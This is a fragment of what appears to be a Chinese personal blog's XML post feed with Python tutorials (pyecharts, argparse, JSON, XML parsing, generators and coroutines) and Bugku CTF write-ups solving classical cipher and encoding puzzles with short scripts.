    <content type="text"><![CDATA[python的pyecharts库可以用来生成图表、词云图等等，简单了解一下 没想到以前在知乎上看到的词云图也是用这个库生成的，真好 生成的实例调用render()方法后就会生成一个本地render.html文件，打开后即可看到生成的图表 在jupyter notebook中可以直接调用实例来直接显示 柱状图Bar:柱状图 123456789101112131415161718192021# 导入柱状图-Barfrom pyecharts import Bar# 设置行名columns = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]# 设置数据data1 = [2.0, 4.9, 7.0, 23.2, 25.6, 76.7, 135.6, 162.2, 32.6, 20.0, 6.4, 3.3]data2 = [2.6, 5.9, 9.0, 26.4, 28.7, 70.7, 175.6, 182.2, 48.7, 18.8, 6.0, 2.3]# 设置柱状图的主标题与副标题bar = Bar("柱状图", "一年的降水量与蒸发量")# 添加柱状图的数据及配置项# mark_line=['average']，即添加数据的平均值# mark_point['max', 'min']，标记数据的最大值和最小值bar.add("降水量", columns, data1, mark_line=["average"], mark_point=["max", "min"])bar.add("蒸发量", columns, data2, mark_line=["average"], mark_point=["max", "min"])# 生成本地文件（默认为render.html文件）bar.render() 在jupyter中最后一行添加 bar即调用实例，可以直接显示生成的图表 饼状图Pie:饼状图 1234567891011121314from pyecharts import Pie# 设置数据attr =["衬衫", "羊毛衫", "雪纺衫", "裤子", "高跟鞋", "袜子"]v1 =[11, 12, 13, 10, 10, 10]# 设置饼状图的主标题及添加配置项pie =Pie("饼图示例")# is_label_show:设置种类及比例是否直接显示，设置为False则将鼠标移动到种类所在位置才显示pie.add("", attr, v1, is_label_show=True)pie.render() 词云图WordCloud:词云图 from pyecharts import WordCloud # 设置数据 name =['Sam S Club', 'Macys', 'Amy Schumer', 'Jurassic World', 'Charter Communications', 'Chick Fil A', 'Planet Fitness', 'Pitch Perfect', 'Express', 'Home', 'Johnny Depp', 'Lena Dunham', 'Lewis Hamilton', 'KXAN', 'Mary Ellen Mark', 'Farrah Abraham', 'Rita Ora', 'Serena Williams', 'NCAA baseball tournament', 'Point Break'] value =[10000, 6181, 4386, 4055, 2467, 2244, 1898, 1484, 1112, 965, 847, 582, 555, 550, 462, 366, 360, 282, 273, 265] # 设置图大小 wordcloud =WordCloud(width=1300, height=620) # 添加参数项 # word_size_range:词的大小范围 wordcloud.add("", name, value, word_size_range=[20, 100]) wordcloud.render() 参考： https://mp.weixin.qq.com/s/GZfrCfDk6KVUxHCLvxmYxw]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python-服务器目录扫描工具]]></title>
    <url>%2F2019%2F02%2F24%2Fpython-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[学习使用python的argparse库；argparse库是python标准库中用来处理命令行参数的库 以下代码均保存在a.py文件中 创建解析器第一个程序 12345678import argparse# 创建ArgumentParser对象# 该对象将包含将命令行解析为python数据类型所需的所有信息parser = argparse.ArgumentParser(description='This is a test', epilog='It is end')# 解析参数parser.parse_args() 打开cmd，执行： python a.py -h输出： usage: a.py [-h] This is a test optional arguments: -h, --help show this help message and exit It is endargparse.ArgumentParser（）方法参数： prog=None 程序名，若想更改usage后出现的a.py，可使用此参数 description=None help时显示的开始文字 epilog=None help时显示的结尾文字 parents=[] 若与其他参数的一些内容一样，可以继承 formatter_class=argparse.HelpFormatter 自定义帮助信息的格式 prefix_chars=’-‘ 命令的前缀，默认是‘-‘ fromfile_prefix_chars=None 命令行参数从文件中读取 argument_default=None 设置一个全局的选项缺省值，一般每个选项单独设置 conflict_handler=’error’ 定义两个add_argument中添加的选项名字发生冲突时怎么处理，默认处理是抛出异常 add_help=True 是否增加-h/–help选项，默认是True 添加参数 位置参数(positional arguments):默认，程序根据参数出现的位置确定 可选参数(optional arguments):程序已提前定义好的参数，不一定需要 ArgumentParser通过调用add_argument()方法来填充有关程序参数的信息；parse_args()调用时会存储和使用此信息；parse_args()运行时，会用’-‘来判断是否为可选参数 添加位置参数 12345678import argparseparser = argparse.ArgumentParser(description='Output what you input')# 添加了位置参数Outputparser.add_argument('Output')args = parser.parse_args()print(args.Output) 打开cmd，输入 python a.py 2333输出 2333 添加可选参数 可以通过一个’-‘来指定短参数，如-h；还可通过’–’来指定的长参数，如–help；可同时指定短、长参数 12345678import argparseparser = argparse.ArgumentParser(description='Output what you input')# 添加了可选参数Outputparser.add_argument('-Output', '--Output')args = parser.parse_args()print(args.Output) 打开cmd，输入 python a.py -h输出 usage: a.py [-h] [-Output OUTPUT] Output what you input optional arguments: -h, --help show this help message and exit -Output OUTPUT, --Output OUTPUT则接着输入 python a.py -Output 2333输出 2333而输入 python a.py 2333会输出报错信息 usage: a.py [-h] [-Output OUTPUT] a.py: error: unrecognized arguments: 2333原因是没有添加位置参数 add_argument()参数信息： action：此参数不存在时默认值为store，存储参数的值，其他值： store_const: 值存放在const中 store_true(store_false): 值存为true(false) append: 存为列表 append_const: 存为列表，会根据const关键参数进行添加 count: 统计参数出现的次数 help: help信息 nargs: 参数的数量 *: 任意多个 +: 一个或更多 ?: 首先从命令行获得参数(0或1)，若没有从const获得，然后从default获得 num：指定参数的数量 const: 保存一个常量 default: 如果命令行中没有出现这个参数，则使用的默认值 type: 参数类型；默认的参数类型为str required: 参数是否必选 dest: 自定义属性名称 metavar: 参数的名字，在显示帮助信息时显示 choices: 可供选择的值；值为列表或迭代器 计算范围内数字的平方 123456import argparseparser = argparse.ArgumentParser()parser.add_argument('-square', '--square', type=int, choices=range(2, 4), help='Input X and Output X^2')args = parser.parse_args()print(args.square**2) 打开cmd，输入 python a.py -square 1输出报错信息 usage: a.py [-h] [-square {2,3}] a.py: error: argument -square/--square: invalid choice: 1 (choose from 2, 3)原因是参数没有在range(2,4)，即[2,3]的范围 输入 python a.py -square 3输出 9 功能： 默认将数字从大到小排序；使用参数可以求数字列最大值、最小值 123456789101112131415import argparseparser = argparse.ArgumentParser()parser.add_argument('sorts', type=int, nargs='+', help='sort the number from big to small')parser.add_argument('-max', '--max', action='store_true', help='calculate the max number')parser.add_argument('-min', '--min', action='store_true', help='calculate the minimal number')args = parser.parse_args()if args.max == 1: print(max(args.sorts))elif args.min == 1: print(min(args.sorts))else: print(sorted(args.sorts, reverse=True)) 参考文章：https://www.jianshu.com/p/fef2d215b91dhttps://docs.python.org/3/library/argparse.html#nargshttps://www.cnblogs.com/linxiyue/p/3908623.html]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[结构化文件存储-Json]]></title>
    <url>%2F2019%2F02%2F16%2F%E7%BB%93%E6%9E%84%E5%8C%96%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8-Json%2F</url>
    <content type="text"><![CDATA[JSON 比 XML 更小、更快，更易解析。 什么是jsonJSON：JavaScript 对象表示法（JavaScript Object Notation）。 Json是一种轻量级的数据交换格式，JSON 文件的文件类型是 “.json” 格式：键值对，大括号包裹，字符串要用双引号 JSON 值可以是： 数字（整数或浮点数） 字符串（在双引号中） 逻辑值（true 或 false） 数组（在中括号中） 对象（在大括号中） nulljson对象json对象在大括号中 {&quot;name&quot;: &quot;xiaoming&quot;}json数组json数组在中括号中 {&quot;sites&quot;: [{&quot;name&quot;: &quot;菜鸟&quot;}, {&quot;name&quot;: &quot;百度&quot;}]}python中的json包在python中，字典的格式是dict，json的格式是str import json json.dumps() :把python格式表示成json json.loads() :把json格式转换成python python读取json文件 json.dump() :把内容写入文件 json.load() :读入json文件 python中的dict与json格式转换： 123456789101112131415161718import jsonstudent = &#123; "name": 'xiaoming', "age": 18, "mobile": '123456789'&#125;print(type(student))stu_json = json.dumps(student)print(type(stu_json))print(stu_json)stu_dict = json.loads(stu_json)print(type(stu_dict))print(stu_dict) 打印结果 &lt;class &apos;dict&apos;&gt; &lt;class &apos;str&apos;&gt; {&quot;name&quot;: &quot;xiaoming&quot;, &quot;age&quot;: 18, &quot;mobile&quot;: &quot;123456789&quot;} &lt;class &apos;dict&apos;&gt; {&apos;name&apos;: &apos;xiaoming&apos;, &apos;age&apos;: 18, &apos;mobile&apos;: &apos;123456789&apos;}注意到单双引号的变化 python中json数据的读写 12345678910import jsondata = &#123;"name": "xiaoming", "age": 12&#125;with open('C:/Users/腾飞/Desktop/a.json', 'w') as f: json.dump(data, f) with open('C:/Users/腾飞/Desktop/a.json', 'r') as f: d = json.load(f) print(type(d)) 打印结果： &lt;class &apos;dict&apos;&gt;由于最外层是大括号，则最终的数据类型是dict]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[结构化文件存储-XML]]></title>
    <url>%2F2019%2F02%2F12%2F%E7%BB%93%E6%9E%84%E5%8C%96%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%2F</url>
    <content type="text"><![CDATA[学习XML XML文件XML(eXtensibleMarkupLanguage, 可扩展标记语言) 标记语言： 语言中可使用尖括号括起来文本字符串 可扩展： 用户可以自定义需要的标记 XML描述的是数据本身，即数据的结构和语义 XML文件以.xml结尾 XML文档的构成 处理指令(可以认为一个文件内只有一个处理指令) 最多只有一行，且位于第一行；内容是与xml相关的一些声明或指令 根元素(一个文件内只有一个根元素) 子元素 属性 内容 注释 注释不能嵌套在标签里 例如 &lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos; ?&gt; &lt;Class&gt; &lt;Student1&gt; &lt;name&gt;xiaoming&lt;/name&gt; &lt;age&gt;15&lt;/age&gt; &lt;/Student1&gt; &lt;Student2&gt; &lt;name&gt;xiaohong&lt;/name&gt; &lt;age&gt;13&lt;/age&gt; &lt;/Student2&gt; &lt;/Class&gt;第一行为处理指令，根元素为Class，Class的子元素为Student 可以双击xml文件在浏览器运行： 若想有多个Class，由于只能有一个根元素，那么此时Class不再是根元素，需后要在最外面增加一个根元素，否则运行会报错 添加属性 &lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos; ?&gt; &lt;School&gt; &lt;Class type=&apos;online&apos; location=&apos;Zhengzhou&apos;&gt; &lt;Student&gt; &lt;name&gt;xiaoming&lt;/name&gt; &lt;age&gt;15&lt;/age&gt; &lt;/Student&gt; &lt;Student&gt; &lt;name&gt;xiaohong&lt;/name&gt; &lt;age&gt;13&lt;/age&gt; &lt;/Student&gt; &lt;/Class&gt; &lt;Class type=&apos;normal&apos; location=&apos;Beijing&apos;&gt; &lt;Student&gt; &lt;name&gt;xiaoming&lt;/name&gt; &lt;age&gt;15&lt;/age&gt; &lt;/Student&gt; &lt;Student&gt; &lt;name&gt;xiaohong&lt;/name&gt; &lt;age&gt;13&lt;/age&gt; &lt;/Student&gt; &lt;/Class&gt; &lt;/School&gt; 使用注释 &lt;!-- This is a zhushi --&gt; &lt;!-- This-is-a-zhushi --&gt; 注释内容可以有一个短横线 &lt;!---This-is-a-zhushi--&gt; 三短横线只能出现在开头保留字符的处理XML中使用的符号可能跟保留字符相冲突 1.可以使用实体引用(EntityReference)表示来保留字符(转义) &lt;score&gt; score&gt;80 &lt;/score&gt; 出错 &lt;score&gt; score &amp;gt; 80 &lt;/score&gt; 使用实体引用2.可以把含有保留字符的部分放在CDATA块内部(不会被解析器解析) &lt;![CDATA[&lt;&gt;&lt;&gt;&gt;&lt;&lt;&lt;]]&gt;3.与CDATA功能相反的，PCDATA可以包含被解析的字符数据 XML标签命名规则 用英文表示，首字母大写 大小写严格区分 标签要配对、一致 空标签：没有值，所以可以不提供结束标签，但是要必须关闭 如： &lt;Name /&gt;命名空间如果将多个内容合并，可能会产生冲突 &lt;Room&gt; &lt;Name&gt; bedroom &lt;/Name&gt; &lt;Location&gt; there &lt;/Location&gt; &lt;/Room&gt; &lt;Person&gt; &lt;Name&gt; xiaoming &lt;/Name&gt; &lt;Age&gt; 15 &lt;/Age&gt; &lt;/Person&gt;合并： &lt;Info&gt; &lt;Name&gt; bedroom &lt;/Name&gt; &lt;Location&gt; there &lt;/Location&gt; &lt;Name&gt; xiaoming &lt;/Name&gt; &lt;Age&gt; 15 &lt;/Age&gt; &lt;/Info&gt;上述就产生了冲突 为了避免冲突，需要给可能冲突的元素添加命名空间xmlns(xml name space) &lt;Infor xmlns:Room=&quot;http://my_room&quot; xmlns:Person=&quot;http://my_person&quot;&gt; &lt;Room:Name&gt; bedroom &lt;/Room:Name&gt; &lt;Location&gt; there &lt;/Location&gt; &lt;Name&gt; xiaoming &lt;/Name&gt; &lt;Age&gt; 15 &lt;/Age&gt; &lt;/Infor&gt;XML DOMXML DOM 定义了访问和处理 XML 文档的标准方法。 根据 DOM，XML 文档中的每个成分都是一个节点。 DOM 是这样规定的： 整个文档是一个文档节点 每个 XML 标签是一个元素节点 包含在 XML 元素中的文本是文本节点 每一个 XML 属性是一个属性节点 注释属于注释节点 使用python进行解析或增改xml时，要以节点进行操作 解析xmlpython中的minidom模块 minidom.parse():加载读取的xml文件，也可以是xml代码 doc.documentElement:获取xml文档对象(根节点) node.getAttribute():获取xml节点的属性值 node.getElementsByTagName():得到一个节点对象集合 node.childNodes:得到所有孩子节点 node.childNodes[index].nodeValue:获得单个节点值 例如，xml文件内容： &lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos; ?&gt; &lt;Infor&gt; &lt;Student1&gt; &lt;Location&gt; there &lt;/Location&gt; &lt;Name&gt; xiaoming &lt;/Name&gt; &lt;Age&gt; 15 &lt;/Age&gt; &lt;/Student1&gt; &lt;Student2&gt; &lt;Location&gt; here &lt;/Location&gt; &lt;Name&gt; xiaohong &lt;/Name&gt; &lt;Age&gt; 18 &lt;/Age&gt; &lt;/Student2&gt; &lt;/Infor&gt;使用minidom来解析这个xml文件： 123456789101112131415161718192021import xml.dom.minidomfrom xml.dom.minidom import parseDomTree = xml.dom.minidom.parse('C:/Users/腾飞/Desktop/a.xml') # 获取dom对象doc = DomTree.documentElement # 获取根节点print(doc) # InforchildNodes = doc.childNodes # 得到所有孩子节点列表print(childNodes) # Student1、Student2t = doc.getElementsByTagName('Student1') # 得到Student1节点对象列表print(t)t1 = t[0] # 取出Student1元素节点t1_name = t1.childNodes # 得到该节点下的所有孩子节点 print(t1_name) # Location、Name、Aget1_location = t1.getElementsByTagName('Location')[0] # 得到Student1的location元素节点t1_location_text = t1_location.childNodes[0] # 得到location文本节点print(t1_location_text.data) # 使用data方法获得文本 打印结果： &lt;DOM Element: Infor at 0x155cd50&gt; [&lt;DOM Text node &quot;&apos;\n\t&apos;&quot;&gt;, &lt;DOM Element: Student1 at 0x1589760&gt;, &lt;DOM Text node &quot;&apos;\n\n\t&apos;&quot;&gt;, &lt;DOM Element: Student2 at 0x1589850&gt;, &lt;DOM Text node &quot;&apos;\n&apos;&quot;&gt;] [&lt;DOM Element: Student1 at 0x1589760&gt;] [&lt;DOM Text node &quot;&apos;\n\t\t&apos;&quot;&gt;, &lt;DOM Element: Location at 0x15897b0&gt;, &lt;DOM Text node &quot;&apos;\n\t\t&apos;&quot;&gt;, &lt;DOM Element: Name at 0x1589710&gt;, &lt;DOM Text node &quot;&apos;\n\t\t&apos;&quot;&gt;, &lt;DOM Element: Age at 0x1589800&gt;, &lt;DOM Text node &quot;&apos;\n\t&apos;&quot;&gt;] there 写入xml minidom.Document()：创建dom树对象 dom.createElement():创建根/子节点 dom.appendChild():添加节点 node.setAttribute():设置节点属性 dom.createTextNode():创建文本节点 dom.writexml():写入xml 使用minidom生成一个xml文件： 12345678910111213141516171819202122232425262728293031323334353637383940#导入minidomfrom xml.dom import minidom# 创建DOM树对象dom = minidom.Document()# 创建根节点。每次都要用DOM对象来创建任何节点。root_node=dom.createElement('root')# 用DOM对象添加根节点dom.appendChild(root_node)# 用DOM对象创建元素子节点book_node=dom.createElement('Book')# 设置该节点的属性book_node.setAttribute('Price','199')# 用父节点对象添加元素子节点root_node.appendChild(book_node)name_node = dom.createElement('Name')root_node.appendChild(name_node)# 用DOM创建文本节点，把文本节点（文字内容）看成子节点name_text=dom.createTextNode('计算机程序设计语言 第1版')# 用添加了文本的节点对象（看成文本节点的父节点）添加文本节点name_node.appendChild(name_text)# 每一个结点对象（包括dom对象本身）都有输出XML内容的方法，如：toxml()--字符串, toprettyxml()--美化树形格式。try: with open('C:/Users/腾飞/Desktop/dom_write.xml','w',encoding='UTF-8') as fh: # 4.writexml()第一个参数是目标文件对象，第二个参数是根节点的缩进格式，第三个参数是其他子节点的缩进格式， # 第四个参数制定了换行格式，第五个参数制定了xml内容的编码。 dom.writexml(fh,indent='',addindent='\t',newl='\n',encoding='UTF-8') print('写入xml OK!')except Exception as err: print('错误信息：&#123;0&#125;'.format(err)) 打印结果 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;root&gt; &lt;Book Price=&quot;199&quot;/&gt; &lt;Name&gt;计算机程序设计语言 第1版&lt;/Name&gt; &lt;/root&gt;]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[协程学习]]></title>
    <url>%2F2019%2F02%2F10%2F%E5%8D%8F%E7%A8%8B%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[学习python的多线程与多进程后，再学学协程 可迭代与迭代器可迭代(Iterable)：可直接作用于for循环的变量 迭代器(Iterator): 不但可以作用于for循环，还可以被next()调用 使用insinstance()判断一个变量是可迭代的还是迭代器 1234567from collections import Iterable,Iterator# insinstance: 判断某个变量是否是一个实例var = [1,2,3,4]print(isinstance(var, Iterable))print(isinstance(var, Iterator)) 打印结果： True False说明： list是可迭代的，但不是迭代器 可以通过iter()将Iterable转换为Iterator 12345678910from collections import Iterable,Iteratorvar = 'hello world'print(isinstance(var, Iterable))print(isinstance(var, Iterator))var_1 = iter(var)print(isinstance(var_1, Iterable))print(isinstance(var_1, Iterator)) 运行结果： True False True True生成器生成器(generator: 一边循环一边计算下一个元素的机制/算法) 需要满足三个条件： 每次调用都生产出for循环需要的下一个元素 若达到最后一个，则抛出StopIteration异常 可以被next函数调用 直接使用直接使用生成器 12345L = [x*x for x in range(5)] # 放在中括号中是列表生成器G = (x*x for x in range(5)) # 放在小括号中是生成器print(type(L))print(type(G)) 打印结果： &lt;class &apos;list&apos;&gt; &lt;class &apos;generator&apos;&gt;yield如果函数中包含yield(类似于return)，则这个函数就叫做生成器 使用next调用函数，遇到yield返回 123456789101112131415161718192021222324252627282930print('使用普通函数')def func(): print('step 1') print('step 2') print('step 3') return Nonefunc()# 执行过程为：找到func这个函数定义的地方-&gt;从上往下依次运行print()print('使用生成器')def func1(): print('step 1') yield 1 print('step 2') yield 2 print('step 3') yield g = func1() # 生成一个生成器gt1 = next(g) # next函数相当于执行下一步，yield返回结果赋值给t1print(t1)t2 = next(g)print(t2)t3 = next(g)print(t3)# 执行过程为： 执行next，从上往下执行，遇到yield则返回结果-&gt;再次执行next，从上回yield执行后接着执行 打印结果： 使用普通函数 step 1 step 2 step 3 使用生成器 step 1 1 step 2 2 step 3 None 使用for循环 1234567891011121314151617# 使用生成器实现斐波那契数列def func(max): n = 0 a = b = 1 while n &lt; max: yield a c = a + b a = b b = c n += 1 return 'Done'G = func(5)for i in range(6): t = next(G) print(t) 打印结果： StopIteration Traceback (most recent call last) &lt;ipython-input-18-885eac2b009f&gt; in &lt;module&gt;() 12 G = func(5) 13 for i in range(6): ---&gt; 14 t = next(G) 15 print(t) StopIteration: Done发现： 达到最后一个后再执行next，会抛出StopIteration异常，返回的值为return的值 在for循环中使用生成器 1234567891011121314def func(max): n = 0 a = b = 1 while n &lt; max: yield a c = a + b a = b b = c n += 1 return 'Done'G = func(5)for i in G: print(i) 打印结果： 1 1 2 3 5生成器的典型用法就是在for中使用，比较常用的生成器就是range -&gt; 小结：生成器节省内存，而list比较消耗内存 协程python3.4引入协程 实现协程较好的包有：asyncio， tornado， gevent 基本使用协程的实现： yield返回 send调用 1234567891011def func(): print('start') x = yield print('receive x: ', x)c = func() # 生成协程cnext(c) # 预激# 让协程执行到第一个yield表达式，准备好作为活跃的协程使用# 或使用c.send(None)预激c.send('hello') # 此时yield会收到值并赋给x 运行结果： start receive x: hello --------------------------------------------------------------------------- StopIteration Traceback (most recent call last) &lt;ipython-input-1-758b3ae2db03&gt; in &lt;module&gt;() 6 c = func() 7 next(c) ----&gt; 8 c.send(&apos;hello&apos;) StopIteration: 协程的状态 GEN_CREATE:等待开始执行 GEN_RUNNING:解释器正在执行，这个状态一般看不到 GEN_SUSPENDED:在yield表达式处暂停 GEN_CLOSED:执行结束 1234567891011121314def func(a): print('start') b = yield a # GEN_SUSPENDED print(a, b) # 5 6 c = yield a+b print(a, b, c) # 5 6 7 # GEN_CLOSEDc = func(5) # GEN_CREATEt1 = next(c) # GEN_RUNNINGprint(t1) # 5t2 = c.send(6) # b = 6print(t2) # 11t3 = c.send(7) # c = 7 打印结果： start 5 5 6 11 5 6 7 --------------------------------------------------------------------------- StopIteration Traceback (most recent call last) &lt;ipython-input-18-d434fb8c4394&gt; in &lt;module&gt;() 11 t2 = c.send(6) # b = 6 12 print(t2) # 11 ---&gt; 13 t3 = c.send(7) # c = 7 14 StopIteration: 委派生成器引入yield from： def gen(): for c in "AB": yield c for i in range(1,3): yield i print(list(gen())) def gen2(): yield from "AB" yield from range(1,3) print(list(gen2())) 打印结果是一样的 [&apos;A&apos;, &apos;B&apos;, 1, 2] [&apos;A&apos;, &apos;B&apos;, 1, 2]yield from x： 表达式对x这个对象所做的第一件事是，调用iter(x),从中获取迭代器，因此x可以是任何可迭代的对象 委派生成器： 包含yield from表达式的生成器函数 委派生成器在yield from表达式处暂停，调用方可直接把数据发给子生成器 子生成器再把值发给调用方 子生成器在最后，解释器会抛出StopIteration，并且把返回值附加到异常对象上 from collections import namedtuple # 命名元组 ResClass = namedtuple('Res', 'count average') # 子生成器 def averager(): total = 0.0 count = 0 average = None while True: term = yield # None是哨兵值 if term is None: break total += term count += 1 average = total/count return ResClass(count, average) # 委派生成器 def grouper(storages, key): while True: storages[key] = yield from averager() # 客户端代码 def client(): process_data = { 'boys_2': [39.0, 40.8, 43.2], 'boys_1': [1.38, 1.5, 1.32] } storages = {} for k, v in process_data.items(): # 生成协程 c = grouper(storages, k) # 预激 next(c) # 传数据 for data in v: c.send(data) # 终止 c.send(None) print(storages) client() 打印结果： {&apos;boys_2&apos;: Res(count=3, average=41.0), &apos;boys_1&apos;: Res(count=3, average=1.4000000000000001)}grouper发送的每个值都会经由yield from处理，通过管道传给averager实例。grouper会在yield from表达式处暂停，等待averager实例处理客户端发来的值。averager实例运行完毕后，返回的值会绑定到results[key]上，while 循环会不断创建averager实例，处理更多的值 参考： https://www.cnblogs.com/zhaof/p/7631851.html]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-托马斯.杰斐逊-转轮密码]]></title>
    <url>%2F2019%2F02%2F06%2FBugku-%E6%89%98%E9%A9%AC%E6%96%AF-%E6%9D%B0%E6%96%90%E9%80%8A-%E8%BD%AC%E8%BD%AE%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[题目： 1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt; 10： &lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt; 11： &lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt; 12： &lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt; 13： &lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt; 14： &lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt; 密钥： 2,5,1,3,6,4,9,7,8,14,10,13,11,12 密文：HCBTSXWCRQGLES flag格式 flag{你解密的内容}转轮密码解密过程： 1.根据秘钥将字符串排序 2.根据密文字符将字符串分成两部分，将后面一部分(含密文字符)与前面一部分进行交换顺序；如， KPBELNACZDTRXMJQOYHGVSFUWI按照秘钥字符H进行排序后为： HGVSFUWIKPBELNACZDTRXMJQOY3.观察转换后的字符串的列 解密思路 1.首先要将字符串部分提取出来，使用了正则表达式 2.由于需要先对照秘钥，按照顺序进行字符串操作，因此用循环遍历秘钥；在遍历秘钥前对其进行转换成列表，且不含逗号 3.由于需要将字符串分成两部分，因此需要对字符串进行切片；由于切片需要字符在字符串中的下标，用到了python的index()函数，返回字符在字符串中首次出现的下标 脚本： 1234567891011121314151617181920212223242526272829303132333435key_index = '2,5,1,3,6,4,9,7,8,14,10,13,11,12'key_index = key_index.split(',')key_letter = 'HCBTSXWCRQGLES'data = '''1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;2： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt;6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt;7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt;10： &lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt;11： &lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt;12： &lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt;13： &lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt;14： &lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt;'''import recontent = re.findall('&lt;(.*?) &lt;',data)indexs = 0for i in key_index: i = int(i) - 1 mes = content[i] position = mes.index('%s' % key_letter[indexs]) splits = mes[position:] origin = mes[:position] new_mes = splits + origin print(new_mes) indexs += 1 输出为： HGVSFUWIKPBELNACZDTRXMJQOY CPMNZQWXYIHFRLABEUOTSGJVDK BVIQHKYPNTCRMOSFEZWAXJGDLU TEQGYXPLOCKBDMAIZVRNSJUWFH SLOQXVETAMKGHIWPNYCJBFZDRU XQYIZMJWAORPLNDVHGFCUKTEBS WATDSRFHENYVUBMCOIKZGJXPLQ CEONJQGWTHSPYBXIZULVKMRAFD RJLXKISEFAPMYGHBQNOZUTWDCV QWXPHKZGJTDSENYVUBMLAOIRFC GOIKFHENYVUWABMCXPLTDSRJQZ LTDENQWAOXPYVUIKZGJBMCSRFH ENYSRUBMCQWVJXPLTDAOIKFZGH SWAYXPLVUBOIKZGJRFHENMCQTD发现倒数第6列为 XSXSBUGKUADMIN]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-进制转换]]></title>
    <url>%2F2019%2F02%2F06%2FBugku-%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[题目：二进制、八进制、十进制、十六进制，你能分的清吗？ 既然是四种进制，于是得到了首字母对应的进制： d : 10进制 x : 16进制 o : 8进制 b : 2进制 解题思路： 1.进行转换时，用到了python的int()函数： int():将一个数字或base类型的字符串转换成整数。 进制转换使用格式： int(字符串，base=进制) (可以省略base，直接使用int(字符串， 进制))2.不能根据字符串中是否有‘d’、‘o’等来判断这个字符串属于什么进制，因为有的字符串中含有两种字母，如’x6d’，因此使用python的startswith()函数，根据首字符来判断该字符串属于什么进制 3.进行转换之前，要将字符串替换掉‘o’、‘d’、‘x’、‘b’，并且只需替换掉开头的字符，使用 i.replace(&apos;o&apos;,&apos;&apos;,1) # 替换次数不超过1 ... 脚本： 12345678910111213141516171819202122232425flag = ''with open('C:/Users/腾飞/Desktop/text.txt','r') as f: content = f.readlines() content = content[0] lists = content.split(' ') for i in lists: if i.startswith('d'): i = i.replace('d', '', 1) i = chr(int(i,base=10)) flag += i elif i.startswith('x'): i = i.replace('x', '', 1) i = chr(int(i,base=16)) flag += i elif i.startswith('o'): i = i.replace('o', '', 1) i = chr(int(i,base=8)) flag += i elif i.startswith('b'): i = i.replace('b', '', 1) i = chr(int(i,base=2)) flag += iprint(flag)]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-一段Base64]]></title>
    <url>%2F2019%2F02%2F03%2FBugku-%E4%B8%80%E6%AE%B5Base64%2F</url>
    <content type="text"><![CDATA[这道题的编码还挺多的，有些没能认出来是什么编码。。 使用了一款软件转换的，参考 https://blog.csdn.net/pdsu161530247/article/details/74640746 第一次解密为base64转字符串，得到的为经过escape加密后的字符串 第二次为解密escape，得到的为16进制 第三次为16进制转text，得到的为经escape加密后的 第四次为unescape，得到的为String.fromCharCode() fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。 第五次为ASCII转text，得到实体编码 第六、七次进行HTML解码]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-ZIP伪加密]]></title>
    <url>%2F2019%2F02%2F02%2FBugku-ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86%2F</url>
